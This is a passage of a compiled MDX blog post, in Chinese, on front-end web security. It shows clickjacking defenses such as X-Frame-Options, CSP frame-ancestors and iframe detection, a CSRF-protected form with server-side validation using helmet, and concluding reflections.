\",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"SAMEORIGIN\"})})})}),\"\\uFF0C\\u7981\\u6B62\\u9875\\u9762\\u88ABiframe\\u5D4C\\u5165\"]}),(0,l.jsx)(e.td,{children:\"\\u6240\\u6709\\u9875\\u9762\"})]}),(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.td,{children:\"Content Security Policy\"}),(0,l.jsxs)(e.td,{children:[\"\\u4F7F\\u7528 \",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"frame-ancestors\"})})})}),\" \\u9650\\u5236iframe\\u6765\\u6E90\"]}),(0,l.jsx)(e.td,{children:\"\\u73B0\\u4EE3\\u6D4F\\u89C8\\u5668\"})]}),(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.td,{children:\"JavaScript\\u68C0\\u6D4B\"}),(0,l.jsxs)(e.td,{children:[\"\\u68C0\\u6D4B\\u9875\\u9762\\u662F\\u5426\\u88ABiframe\\u5D4C\\u5165\\uFF08\\u5982\\u68C0\\u67E5 \",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"window.top !== window\"})})})}),\"\\uFF09\"]}),(0,l.jsx)(e.td,{children:\"\\u52A8\\u6001\\u9875\\u9762\"})]}),(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.td,{children:\"UI\\u660E\\u786E\\u6027\"}),(0,l.jsx)(e.td,{children:\"\\u654F\\u611F\\u64CD\\u4F5C\\u9700\\u7528\\u6237\\u660E\\u786E\\u4EA4\\u4E92\\uFF08\\u5982\\u62D6\\u62FD\\u3001\\u8F93\\u5165\\u9A8C\\u8BC1\\u7801\\uFF09\"}),(0,l.jsx)(e.td,{children:\"\\u9AD8\\u98CE\\u9669\\u64CD\\u4F5C\"})]})]})]}),`\n`,(0,l.jsx)(e.h4,{id:\"\\u4EE3\\u7801\\u793A\\u4F8Bx-frame-options\",children:(0,l.jsx)(e.a,{href:\"#\\u4EE3\\u7801\\u793A\\u4F8Bx-frame-options\",children:\"\\u4EE3\\u7801\\u793A\\u4F8B\\uFF1AX-Frame-Options\"})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u540E\\u7AEF\\u8BBE\\u7F6E\\uFF1A\"}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"javascript\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.code,{\"data-language\":\"javascript\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"res.\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"setHeader\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"(\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"'X-Frame-Options'\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\", \"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"'DENY'\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\");\"})]})})})}),`\n`,(0,l.jsx)(e.p,{children:\"JavaScript\\u68C0\\u6D4B\\uFF1A\"}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"javascript\",\"data-theme\":\"github-dark\",children:(0,l.jsxs)(e.code,{\"data-language\":\"javascript\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:[(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"if\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\" (window.top \"}),(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"!==\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\" window.self) {\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"  document.body.innerHTML \"}),(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\" '\\u6B64\\u9875\\u9762\\u4E0D\\u5141\\u8BB8\\u5D4C\\u5165iframe\\uFF01'\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\";\"})]}),`\n`,(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"}\"})})]})})}),`\n`,(0,l.jsx)(e.p,{children:(0,l.jsx)(e.em,{children:\"\\u5C0FTips\\uFF1AX-Frame-Options\\u662F\\u8001\\u724C\\u9632\\u5FA1\\u624B\\u6BB5\\uFF0C\\u4F46CSP\\u66F4\\u7075\\u6D3B\\uFF0C\\u63A8\\u8350\\u7ED3\\u5408\\u4F7F\\u7528\\u3002\"})}),`\n`,(0,l.jsx)(e.h3,{id:\"35-\\u70B9\\u51FB\\u52AB\\u6301\\u7684\\u54F2\\u5B66\\u900F\\u660E\\u4E0E\\u771F\\u5B9E\",children:(0,l.jsx)(e.a,{href:\"#35-\\u70B9\\u51FB\\u52AB\\u6301\\u7684\\u54F2\\u5B66\\u900F\\u660E\\u4E0E\\u771F\\u5B9E\",children:\"3.5 \\u70B9\\u51FB\\u52AB\\u6301\\u7684\\u54F2\\u5B66\\uFF1A\\u900F\\u660E\\u4E0E\\u771F\\u5B9E\"})}),`\n`,(0,l.jsxs)(e.p,{children:[\"\\u70B9\\u51FB\\u52AB\\u6301\\u8BA9\\u6211\\u4EEC\\u53CD\\u601D\",(0,l.jsx)(e.strong,{children:\"\\u900F\\u660E\\u6027\"}),\"\\u7684\\u91CD\\u8981\\u6027\\u3002\\u7528\\u6237\\u754C\\u9762\\u4E0D\\u4EC5\\u662F\\u529F\\u80FD\\u7684\\u8F7D\\u4F53\\uFF0C\\u66F4\\u662F\\u4FE1\\u4EFB\\u7684\\u6865\\u6881\\u3002\\u5F00\\u53D1\\u8005\\u9700\\u8981\\u786E\\u4FDD\\u6BCF\\u4E00\\u6B21\\u70B9\\u51FB\\u90FD\\u771F\\u5B9E\\u53CD\\u6620\\u7528\\u6237\\u610F\\u56FE\\uFF0C\\u8FD9\\u4E0D\\u4EC5\\u662F\\u6280\\u672F\\u8981\\u6C42\\uFF0C\\u66F4\\u662F\\u7528\\u6237\\u4F53\\u9A8C\\u7684\\u54F2\\u5B66\\u3002\"]}),`\n`,(0,l.jsxs)(e.blockquote,{children:[`\n`,(0,l.jsx)(e.p,{children:\"\\u201C\\u771F\\u5B9E\\u662F\\u4FE1\\u4EFB\\u7684\\u8D77\\u70B9\\uFF0C\\u900F\\u660E\\u662F\\u5B89\\u5168\\u7684\\u5F52\\u5BBF\\u3002\\u201D \\u2014\\u2014 \\u539F\\u521B\"}),`\n`]}),`\n`,(0,l.jsx)(e.p,{children:\"\\u5728\\u8BBE\\u8BA1\\u7CFB\\u7EDF\\u65F6\\uFF0C\\u6211\\u4EEC\\u9700\\u8981\\u4ECE\\u7528\\u6237\\u89C6\\u89D2\\u51FA\\u53D1\\uFF0C\\u51CF\\u5C11\\u201C\\u9690\\u5F62\\u201D\\u64CD\\u4F5C\\uFF0C\\u786E\\u4FDD\\u4EA4\\u4E92\\u7684\\u6BCF\\u4E00\\u6B65\\u90FD\\u6E05\\u6670\\u53EF\\u63A7\\u3002\"}),`\n`,(0,l.jsx)(e.h2,{id:\"\\u56DB\\u7EFC\\u5408\\u9632\\u5FA1\\u67B6\\u6784\\u5C42\\u9762\\u7684\\u5B89\\u5168\\u4E4B\\u9053-\\uFE0F\",children:(0,l.jsx)(e.a,{href:\"#\\u56DB\\u7EFC\\u5408\\u9632\\u5FA1\\u67B6\\u6784\\u5C42\\u9762\\u7684\\u5B89\\u5168\\u4E4B\\u9053-\\uFE0F\",children:\"\\u56DB\\u3001\\u7EFC\\u5408\\u9632\\u5FA1\\uFF1A\\u67B6\\u6784\\u5C42\\u9762\\u7684\\u5B89\\u5168\\u4E4B\\u9053 \\u{1F6E1}\\uFE0F\"})}),`\n`,(0,l.jsxs)(e.p,{children:[\"XSS\\u3001CSRF\\u548C\\u70B9\\u51FB\\u52AB\\u6301\\u867D\\u7136\\u5404\\u6709\\u7279\\u70B9\\uFF0C\\u4F46\\u5B83\\u4EEC\\u7684\\u9632\\u5FA1\\u6709\\u7740\\u5171\\u540C\\u7684\\u54F2\\u5B66\\uFF1A\",(0,l.jsx)(e.strong,{children:\"\\u6700\\u5C0F\\u4FE1\\u4EFB\"}),\"\\u3001\",(0,l.jsx)(e.strong,{children:\"\\u5206\\u5C42\\u9632\\u62A4\"}),\"\\u548C\",(0,l.jsx)(e.strong,{children:\"\\u7528\\u6237\\u4F18\\u5148\"}),\"\\u3002\\u4EE5\\u4E0B\\u662F\\u67B6\\u6784\\u5C42\\u9762\\u7684\\u5EFA\\u8BAE\\uFF1A\"]}),`\n`,(0,l.jsxs)(e.ol,{children:[`\n`,(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.strong,{children:\"\\u8F93\\u5165\\u4E0E\\u8F93\\u51FA\\u5206\\u79BB\"}),\"\\uFF1A\\u5C06\\u7528\\u6237\\u8F93\\u5165\\u89C6\\u4E3A\\u201C\\u4E0D\\u53EF\\u4FE1\\u201D\\uFF0C\\u5728\\u8F93\\u5165\\u7AEF\\u9A8C\\u8BC1\\u683C\\u5F0F\\uFF0C\\u5728\\u8F93\\u51FA\\u7AEF\\u8F6C\\u4E49\\u5185\\u5BB9\\u3002\"]}),`\n`,(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.strong,{children:\"\\u5206\\u5C42\\u9632\\u5FA1\"}),\"\\uFF1A\\u4ECE\\u6D4F\\u89C8\\u5668\\uFF08CSP\\u3001X-Frame-Options\\uFF09\\u3001\\u524D\\u7AEF\\uFF08\\u8F6C\\u4E49\\u3001Token\\uFF09\\u3001\\u540E\\u7AEF\\uFF08\\u9A8C\\u8BC1\\u3001\\u6743\\u9650\\uFF09\\u591A\\u5C42\\u9632\\u62A4\\u3002\"]}),`\n`,(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.strong,{children:\"\\u81EA\\u52A8\\u5316\\u68C0\\u6D4B\"}),\"\\uFF1A\\u96C6\\u6210\\u5B89\\u5168\\u626B\\u63CF\\u5DE5\\u5177\\uFF08\\u5982OWASP ZAP\\uFF09\\u5230CI/CD\\u6D41\\u7A0B\\uFF0C\\u53CA\\u65F6\\u53D1\\u73B0\\u6F0F\\u6D1E\\u3002\"]}),`\n`,(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.strong,{children:\"\\u7528\\u6237\\u6559\\u80B2\"}),\"\\uFF1A\\u901A\\u8FC7UI\\u63D0\\u793A\\uFF08\\u5982\\u201C\\u6B63\\u5728\\u63D0\\u4EA4\\u654F\\u611F\\u64CD\\u4F5C\\u201D\\uFF09\\uFF0C\\u589E\\u5F3A\\u7528\\u6237\\u7684\\u5B89\\u5168\\u610F\\u8BC6\\u3002\"]}),`\n`]}),`\n`,(0,l.jsx)(e.p,{children:(0,l.jsx)(e.em,{children:\"\\u5C0FTips\\uFF1A\\u5B89\\u5168\\u4E0D\\u662F\\u4E00\\u6B21\\u6027\\u4EFB\\u52A1\\uFF0C\\u800C\\u662F\\u8D2F\\u7A7F\\u5F00\\u53D1\\u5168\\u6D41\\u7A0B\\u7684\\u4E60\\u60EF\\u3002\"})}),`\n`,(0,l.jsx)(e.h3,{id:\"\\u7EFC\\u5408\\u793A\\u4F8B\\u5B89\\u5168\\u7684\\u8868\\u5355\\u63D0\\u4EA4\",children:(0,l.jsx)(e.a,{href:\"#\\u7EFC\\u5408\\u793A\\u4F8B\\u5B89\\u5168\\u7684\\u8868\\u5355\\u63D0\\u4EA4\",children:\"\\u7EFC\\u5408\\u793A\\u4F8B\\uFF1A\\u5B89\\u5168\\u7684\\u8868\\u5355\\u63D0\\u4EA4\"})}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"html\",\"data-theme\":\"github-dark\",children:(0,l.jsxs)(e.code,{\"data-language\":\"html\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:[(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"<\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"form\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" action\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"/transfer\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" method\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"POST\"'}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"  <\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"input\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" type\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"hidden\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" name\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"_csrf\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" value\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"'}),(0,l.jsx)(e.span,{style:{color:\"#FDAEB7\",fontStyle:\"italic\"},children:\"<\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'%= csrfToken %>\"'}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"  <\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"input\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" type\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"text\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" name\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"amount\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" required\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" pattern\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"[0-9]+\"'}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"  <\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"button\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" type\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"submit\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" onclick\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"confirm\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:`('\\u786E\\u8BA4\\u8F6C\\u8D26\\uFF1F')\"`}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\\u63D0\\u4EA4</\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"button\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"</\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"form\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]})]})})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u540E\\u7AEF\\uFF1A\"}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"javascript\",\"data-theme\":\"github-dark\",children:(0,l.jsxs)(e.code,{\"data-language\":\"javascript\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:[(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"app.\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"use\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"(\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"helmet\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"()); \"}),(0,l.jsx)(e.span,{style:{color:\"#6A737D\"},children:\"// \\u8BBE\\u7F6EX-Frame-Options\\u7B49\\u5B89\\u5168\\u5934\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"app.\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"post\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"(\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"'/transfer'\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\", (\"}),(0,l.jsx)(e.span,{style:{color:\"#FFAB70\"},children:\"req\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\", \"}),(0,l.jsx)(e.span,{style:{color:\"#FFAB70\"},children:\"res\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\") \"}),(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"=>\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\" {\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"  if\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\" (req.body._csrf \"}),(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"!==\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\" req.cookies.csrfToken) {\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"    return\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\" res.\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"status\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"(\"}),(0,l.jsx)(e.span,{style:{color:\"#79B8FF\"},children:\"403\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\").\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"send\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"(\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"'Invalid CSRF Token'\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\");\"})]}),`\n`,(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"  }\"})}),`\n`,(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{style:{color:\"#6A737D\"},children:\"  // \\u9A8C\\u8BC1\\u8F93\\u5165\"})}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"  if\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\" (\"}),(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"!\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"/\"}),(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"^\"}),(0,l.jsx)(e.span,{style:{color:\"#79B8FF\"},children:\"[0-9]\"}),(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"+$\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"/\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\".\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"test\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"(req.body.amount)) {\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"    return\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\" res.\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"status\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"(\"}),(0,l.jsx)(e.span,{style:{color:\"#79B8FF\"},children:\"400\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\").\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"send\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"(\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"'Invalid amount'\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\");\"})]}),`\n`,(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"  }\"})}),`\n`,(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{style:{color:\"#6A737D\"},children:\"  // \\u5904\\u7406\\u8F6C\\u8D26\"})}),`\n`,(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"});\"})})]})})}),`\n`,(0,l.jsx)(e.p,{children:(0,l.jsxs)(e.em,{children:[\"\\u5C0FTips\\uFF1A\\u4F7F\\u7528\",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"helmet\"})})})}),\"\\u7B49\\u4E2D\\u95F4\\u4EF6\\u80FD\\u5FEB\\u901F\\u589E\\u5F3A\\u540E\\u7AEF\\u5B89\\u5168\\uFF0C\\u4F46\\u4ECD\\u9700\\u624B\\u52A8\\u68C0\\u67E5\\u914D\\u7F6E\\u3002\"]})}),`\n`,(0,l.jsx)(e.h2,{id:\"\\u4E94\\u7ED3\\u8BED\\u5B89\\u5168\\u7684\\u827A\\u672F\\u4E0E\\u4F7F\\u547D\",children:(0,l.jsx)(e.a,{href:\"#\\u4E94\\u7ED3\\u8BED\\u5B89\\u5168\\u7684\\u827A\\u672F\\u4E0E\\u4F7F\\u547D\",children:\"\\u4E94\\u3001\\u7ED3\\u8BED\\uFF1A\\u5B89\\u5168\\u7684\\u827A\\u672F\\u4E0E\\u4F7F\\u547D\"})}),`\n`,(0,l.jsxs)(e.blockquote,{children:[`\n`,(0,l.jsx)(e.p,{children:\"\\u201C\\u5B89\\u5168\\u5982\\u98CE\\uFF0C\\u89E6\\u4E4B\\u65E0\\u5F62\\uFF0C\\u5931\\u4E4B\\u81F4\\u547D\\u3002\\u201D \\u2014\\u2014 \\u539F\\u521B\"}),`\n`]}),`\n`,(0,l.jsx)(e.p,{children:\"XSS\\u3001CSRF\\u548C\\u70B9\\u51FB\\u52AB\\u6301\\u4E0D\\u4EC5\\u662F\\u6280\\u672F\\u6311\\u6218\\uFF0C\\u66F4\\u662F\\u5F00\\u53D1\\u8005\\u5BF9\\u7528\\u6237\\u3001\\u5BF9\\u7CFB\\u7EDF\\u7684\\u627F\\u8BFA\\u3002\\u5B83\\u4EEC\\u63D0\\u9192\\u6211\\u4EEC\\uFF0C\\u4EE3\\u7801\\u4E0D\\u4EC5\\u662F\\u529F\\u80FD\\u7684\\u5B9E\\u73B0\\uFF0C\\u66F4\\u662F\\u4FE1\\u4EFB\\u7684\\u4F20\\u9012\\u3002\\u5728\\u8FD9\\u573A\\u4E0E\\u653B\\u51FB\\u8005\\u7684\\u535A\\u5F08\\u4E2D\\uFF0C\\u6211\\u4EEC\\u9700\\u8981\\u4EE5\\u8BD7\\u4EBA\\u7684\\u6D6A\\u6F2B\\u4E66\\u5199\\u4EE3\\u7801\\uFF0C\\u4EE5\\u5C06\\u519B\\u7684\\u4E25\\u8C28\\u5B88\\u62A4\\u5B89\\u5168\\uFF0C\\u4EE5\\u54F2\\u5B66\\u5BB6\\u7684\\u6DF1\\u9083\\u601D\\u8003\\u67B6\\u6784\\u3002\"}),`\n`,(0,l.jsx)(e.p,{children:\"\\u613F\\u4F60\\u5728\\u8FD9\\u6761\\u5B89\\u5168\\u7684\\u65C5\\u9014\\u4E2D\\uFF0C\\u4E0D\\u4EC5\\u6536\\u83B7\\u6280\\u672F\\uFF0C\\u66F4\\u6536\\u83B7\\u5BF9Web\\u5F00\\u53D1\\u7684\\u656C\\u754F\\u4E0E\\u70ED\\u7231\\u3002\\u8BA9\\u6211\\u4EEC\\u4EE5\\u4EE3\\u7801\\u4E3A\\u7B14\\uFF0C\\u4EE5\\u5B89\\u5168\\u4E3A\\u58A8\\uFF0C\\u4E66\\u5199\\u5C5E\\u4E8E\\u524D\\u7AEF\\u5F00\\u53D1\\u8005\\u7684\\u53F2\\u8BD7\\uFF01\\u2728\"}),`\n`,(0,l.jsx)(e.hr,{})]})}function o(n={}){let{wrapper:e}=n.components||{};return e?(0,l.jsx)(e,{...n,children:(0,l.jsx)(s,{...n})}):s(n)}return B(b);})();\n;return Component;"
  },
  "_id": "å‰ç«¯æŠ€æœ¯/å‰ç«¯å®‰å…¨/æ´æ‚‰Webå®‰å…¨-æ·±å…¥å‰–æXSS-CSRFä¸ç‚¹å‡»åŠ«æŒ.mdx",
  "_raw": {
    "sourceFilePath": "å‰ç«¯æŠ€æœ¯/å‰ç«¯å®‰å…¨/æ´æ‚‰Webå®‰å…¨-æ·±å…¥å‰–æXSS-CSRFä¸ç‚¹å‡»åŠ«æŒ.mdx",
    "sourceFileName": "æ´æ‚‰Webå®‰å…¨-æ·±å…¥å‰–æXSS-CSRFä¸ç‚¹å‡»åŠ«æŒ.mdx",
    "sourceFileDir": "å‰ç«¯æŠ€æœ¯/å‰ç«¯å®‰å…¨",
    "contentType": "mdx",
    "flattenedPath": "å‰ç«¯æŠ€æœ¯/å‰ç«¯å®‰å…¨/æ´æ‚‰Webå®‰å…¨-æ·±å…¥å‰–æXSS-CSRFä¸ç‚¹å‡»åŠ«æŒ"
  },
  "type": "Post",
  "url": "/blog/å‰ç«¯æŠ€æœ¯/å‰ç«¯å®‰å…¨/æ´æ‚‰Webå®‰å…¨-æ·±å…¥å‰–æXSS-CSRFä¸ç‚¹å‡»åŠ«æŒ"
}